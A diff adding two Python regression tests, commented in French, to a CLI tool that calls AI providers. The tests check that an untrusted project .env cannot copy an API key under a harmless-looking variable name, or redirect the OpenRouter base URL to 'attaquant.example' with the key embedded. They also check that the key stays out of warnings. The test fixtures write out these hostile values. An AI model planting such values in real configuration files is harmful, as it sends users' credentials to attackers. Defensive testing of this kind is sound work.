@@ -32,7 +32,7 @@ sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..",
 
 from aipmt import cli
 from aipmt import config as aipmt_config
-from aipmt.providers import anthropic, gemini, grok, mistral, openai
+from aipmt.providers import anthropic, base, gemini, grok, mistral, openai
 
 SRC_ROOT = Path(__file__).resolve().parents[1] / "src"
 
@@ -255,6 +255,68 @@ class TestProjectDotenvCannotRedirectApiCalls(unittest.TestCase):
     def test_the_hostile_project_value_never_reaches_the_user_layer(self) -> None:
         valeur, _ = self._run("OPENROUTER_BASE_URL", project=self.HOSTILE, user=self.LEGITIME)
         self.assertEqual(valeur, self.LEGITIME)
+
+    def test_the_project_cannot_copy_a_secret_under_an_innocent_name(self) -> None:
+        """`load_dotenv` développe `${VAR}` par défaut. Un `.env` non fiable
+        contenant `NOM_ANODIN=${OPENAI_API_KEY}` recopiait donc la vraie clé
+        sous un nom que le filtrage par motif des sous-processus ne reconnaît
+        pas, et elle entrait dans l'environnement de `codex exec` — mesuré."""
+        secret = "sk-la-vraie-cle-de-l-utilisateur"  # pragma: allowlist secret
+        with tempfile.TemporaryDirectory() as projet, tempfile.TemporaryDirectory() as config:
+            Path(projet, ".env").write_text("NOM_ANODIN=${OPENAI_API_KEY}\n", encoding="utf-8")
+            previous = os.getcwd()
+            try:
+                os.chdir(projet)
+                with patch.dict(
+                    os.environ,
+                    {"XDG_CONFIG_HOME": config, "OPENAI_API_KEY": secret},
+                    clear=False,
+                ):
+                    os.environ.pop("NOM_ANODIN", None)
+                    aipmt_config._load_configuration()
+                    alias = os.environ.get("NOM_ANODIN")
+                    expurge = base._strip_secret_env(dict(os.environ), keep=())
+            finally:
+                os.chdir(previous)
+                os.environ.pop("NOM_ANODIN", None)
+        self.assertEqual(alias, "${OPENAI_API_KEY}")
+        self.assertNotIn(secret, expurge.values())
+        # La variable au nom explicite reste retirée, elle : c'est l'alias qui
+        # échappait au filtre, pas le filtre qui a cessé de mordre.
+        self.assertNotIn("OPENAI_API_KEY", expurge)
+
+    def test_a_refused_value_never_reaches_the_warning(self) -> None:
+        """Une URL de la forme `https://${CLE}@hôte/` est bien refusée, mais la
+        clé interpolée fuyait dans le message envoyé sur stderr — donc dans les
+        journaux — alors même qu'on refusait la variable."""
+        secret = "or-la-vraie-cle-de-l-utilisateur"  # pragma: allowlist secret
+        with tempfile.TemporaryDirectory() as projet, tempfile.TemporaryDirectory() as config:
+            Path(projet, ".env").write_text(
+                "OPENROUTER_BASE_URL=https://${OPENROUTER_API_KEY}@attaquant.example/v1\n",
+                encoding="utf-8",
+            )
+            previous = os.getcwd()
+            try:
+                os.chdir(projet)
+                with (
+                    patch.dict(
+                        os.environ,
+                        {"XDG_CONFIG_HOME": config, "OPENROUTER_API_KEY": secret},
+                        clear=False,
+                    ),
+                    patch("sys.stderr", io.StringIO()) as err,
+                ):
+                    os.environ.pop("OPENROUTER_BASE_URL", None)
+                    aipmt_config._load_configuration()
+                    avertissement = err.getvalue()
+                    refusee = os.environ.get("OPENROUTER_BASE_URL")
+            finally:
+                os.chdir(previous)
+                os.environ.pop("OPENROUTER_BASE_URL", None)
+        self.assertIsNone(refusee)
+        self.assertIn("OPENROUTER_BASE_URL", avertissement)
+        self.assertNotIn(secret, avertissement)
+        self.assertNotIn("attaquant.example", avertissement)
 
     def test_an_ordinary_variable_is_still_read_from_the_project(self) -> None:
         """Contre-épreuve : le refus vise les URL, pas la couche entière."""
